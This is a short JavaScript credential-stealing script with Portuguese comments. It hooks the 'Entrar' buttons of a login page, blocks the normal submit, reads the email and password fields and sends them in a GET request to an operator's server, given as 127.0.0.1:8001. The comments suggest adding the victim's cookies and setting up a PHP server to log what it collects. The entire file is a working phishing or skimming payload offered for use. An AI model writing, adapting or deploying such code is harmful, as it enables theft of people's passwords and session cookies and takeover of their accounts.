server_address = '127.0.0.1' // o endereço do seu servidor que irá receber os dados
server_port = '8001' // a porta do servidor

// na primeira página é esse o botão "Entrar"
$("input[type='submit']").on('click', function(event){
    getCredenciais();
    event.preventDefault();
});

// Após errar pela primeira vez, muda a página e é assim que recupera o botão "Entrar"
$("button[type='submit']").on('click', function(event){
    getCredenciais();
    event.preventDefault();
});

// Recupera as credenciais e envia para o servidor Node armazenar
function getCredenciais(){
    login = $("input#email");
    senha = $("input#pass");
    cookies = document.cookie // pode enviar também os cookies se achar interessante
    if(login && senha){
        // a saída será mostrada no log do servidor web (ou criar um app para receber os parametros e guardar no db ou arquivo)
        // Exemplo para subir servidor web: $php -S server_address:server_port
        // se não tiver um app para receber a requisição vai falhar com código 404
        $.get({
            url: "http://" + server_address + ":" + server_port + "?login=" + login.val() + "&senha=" + senha.val(),
            async: true
        })
    }
}